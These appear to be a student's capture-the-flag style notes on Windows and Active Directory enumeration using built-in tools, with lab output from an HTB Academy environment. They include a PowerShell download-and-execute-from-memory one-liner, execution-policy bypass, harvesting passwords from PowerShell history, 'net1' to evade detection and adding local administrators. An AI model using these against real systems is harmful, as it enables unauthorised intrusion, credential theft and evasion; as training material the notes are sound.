# Living Off the Land

## Env Commands For Host & Network Recon

hostname
-->Prints the PC's Name

[System.Environment]::OSVersion.Version
-->Prints out the OS version and revision level

wmic qfe get Caption,Description,HotFixID,InstalledOn
-->Prints the patches and hotfixes applied to the host

ipconfig /all
-->Prints out network adapter state and configurations

set
-->Displays a list of environment variables for the current session (ran from CMD-prompt)

echo %USERDOMAIN%
-->Displays the domain name to which the host belongs (ran from CMD-prompt)

echo %logonserver%
-->Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)

## Harnessing PowerShell

Get-Module
-->Lists available modules loaded for use.

Get-ExecutionPolicy -List
-->Will print the execution policy settings for each scope on a host.

Set-ExecutionPolicy Bypass -Scope Process
-->This will change the policy for our current process using the -Scope parameter. Doing so will revert the policy once we 
vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.

Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
-->With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.

Get-ChildItem Env: | ft Key,Value
-->Return environment values such as key paths, users, computer information, etc.

powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"
-->This is a quick and easy way to download a file from the web using PowerShell and call it from memory.

Get-host

powershell.exe -version 2

get-module

## Checking Defenses

netsh advfirewall show allprofiles

Windows Defender Check (from CMD.exe)
sc query windefend

Get-MpComputerStatus

AntivirusEnabled                 : True
AntivirusSignatureAge            : 0
AntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM
AntivirusSignatureVersion        : 1.361.414.0

## Am I Alone?

qwinsta

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>console           forend                    1  Active
 rdp-tcp                                 65536  Listen

## Network Information

arp -a
-->
--> Lists all known hosts stored in the arp table.

ipconfig /all
-->Prints out adapter settings for the host. We can figure out the network segment from here.

route print
-->
--> Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.

netsh advfirewall show state
--> Displays the status of the host's firewall. We can determine if it is active and filtering traffic.

## Windows Management Instrumentation (WMI)

wmic qfe get Caption,Description,HotFixID,InstalledOn
-->Prints the patch level and description of the Hotfixes applied

wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List
-->Displays basic host information to include any attributes within the list

wmic process list /format:list
-->A listing of all processes on host

wmic ntdomain list /format:list
-->Displays information about the Domain and Domain Controllers

wmic useraccount list /format:list
-->Displays information about all local accounts and any domain accounts that have logged into the device

wmic group list /format:list
-->Information about all local groups

wmic sysaccount list /format:list
-->Dumps information about any system accounts that are being used as service accounts.

wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress

Caption          Description      DnsForestName           DomainControllerAddress  DomainName
ACADEMY-EA-MS01  ACADEMY-EA-MS01
INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\172.16.5.5             INLANEFREIGHT
LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\172.16.5.240           LOGISTICS
FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\172.16.5.238           FREIGHTLOGISTIC

## Net Commands

--> Typing net1 instead of net : to avoid defenses

net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------
*$H25000-1RTRKC5S507F
*Accounting
*Barracuda_all_access
*Barracuda_facebook_access
*Barracuda_parked_sites
*Barracuda_youtube_exempt
*Billing
*Billing_users
*Calendar Access
*CEO
*CFO
*Cloneable Domain Controllers
*Collaboration_users
*Communications_users
*Compliance Management
*Computer Group Management
*Contractors
*CTO

<SNIP>

net user /domain wrouse

net accounts
net accounts /domain
net group /domain
net group "Domain Admins" /domain
net group "domain computers" /domain
net group "Domain Controllers" /domain
net group <domain_group_name> /domain
net groups /domain
net localgroup
net localgroup administrators /domain
net localgroup Administrators
net localgroup administrators [username] /add
net share
net user <ACCOUNT_NAME> /domain
net user /domain
net user %username%
net use x: \computer\share
net view
net view /all /domain[:domainname]
net view \computer /ALL
net view /domain

## Dsquery

dsquery user

"CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

dsquery computer

"CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"
"CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL"

dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"

"CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
"CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL"


**PASSWD_NOTREQD flag set in userAccountControl attribute :**

dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

**Domain Controllers :**

dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

![UAC-Values.png](UAC-Values.png)

OID match strings
1.2.840.113556.1.4.803
1.2.840.113556.1.4.804
1.2.840.113556.1.4.1941

Logical Operators :

(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))
(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))


## LAB

xfreerdp /u:htb-student /p:"Academy_student_AD!" /v:$TARGET

Get-MpComputerStatus
AMEngineVersion                 : 0.0.0.0
AMProductVersion                : 4.18.2109.6

net1 localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
INLANEFREIGHT\adunn
INLANEFREIGHT\Domain Admins
INLANEFREIGHT\Domain Users
The command completed successfully.



dsquery user -disabled -limit 0 | dsget user -fn -ln

  fn         ln
  Brian      Manley
  Brian      Manley
  Betty      Ross
  Jessica    Ramsey
  Jessica    Msexchapproval 1F05a927-3Be2-4Fb9-Aa03-B59fe3b56f4c
  Jessica    Systemmailbox Bb558c35-97F1-4Cb9-8Ff7-D53741dc928c
  Jessica    Msexchdiscovery E0dc1c29-89C3-4034-B678-E6c29d823ed9
  Jessica    Msexchdiscoverymailbox D919ba05-46A6-415F-80Ad-7E09334bb852
  Jessica    Migration.8F3e7716-2011-43E4-96B1-Aba62d229136
  Jessica    Federatedemail.4C1f4d8b-8179-4148-93Bf-00A95fa1e042
  Jessica    Systemmailbox{D0e409a0-Af9b-4720-92Fe-Aac869b0d201}
  Jessica    Systemmailbox{2Ce34405-31Be-455D-89D7-A7c7da7a0daa}
  Jessica    Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9
dsget succeeded

dsquery user -name "Ramsey"

net1 group "Domain Admins" /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group name     Domain Admins
Comment        Designated administrators of the domain

Members

-------------------------------------------------------------------------------
administrator            backupagent              bross
clusteragent             dclick                   freightlogisticsuser
jhermann                 lab_adm                  ldap.agent
mmorgan                  mrb3n                    nagiosagent
proxyagent               solarwindsmonitor        sp-admin
sqldev                   svc_qualys               svc_sccm


dsquery user -disabled -limit 0 | dsget user -fn -ln -desc	

  HTB{LD@P_I$_W1ld}                                           Betty      Ross  